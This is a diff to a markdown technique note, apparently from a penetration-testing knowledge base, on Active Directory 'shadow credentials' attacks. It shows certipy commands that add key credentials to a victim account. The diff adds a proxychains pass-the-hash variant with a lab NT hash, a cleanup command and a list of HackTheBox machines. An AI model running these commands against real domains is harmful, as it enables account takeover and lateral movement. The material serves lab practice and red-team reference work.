@@ -4,7 +4,7 @@ type: technique
 tags: [active-directory, certificates, exploitation, reference-import, shadow-credentials, windows]
 phase: exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
+date_updated: 2026-09-10
 sources: [InternalAllTheThings]
 ---
 
@@ -50,6 +50,18 @@ The following imported sections retain upstream ordering, tables, and copy-pasta
 certipy shadow auto -account user -dc-ip 10.10.10.10 -dns-tcp -ns 10.10.10.10 -k -no-pass -target dc.domain.lab
 certipy shadow -u 'attacker@domain.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -account 'victim' add
 ```
+
+Behind a pivot:
+
+```bash
+sudo proxychains -q certipy shadow auto \
+  -username 'svc_ca$@mist.htb' -hashes :07bb1cde74ed154fcec836bc1122bdcc \
+  -account svc_cabackup
+```
+
+If interrupted mid-attack, use `certipy shadow clear -account <target>` to remove the dangling key credential.
+
+HTB machines: Certified (certified.htb), Rebound (rebound.htb), Absolute (absolute.htb), TombWatcher (tombwatcher.htb), Haze (haze.htb), Mist (mist.htb)
 
 * [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD):
 
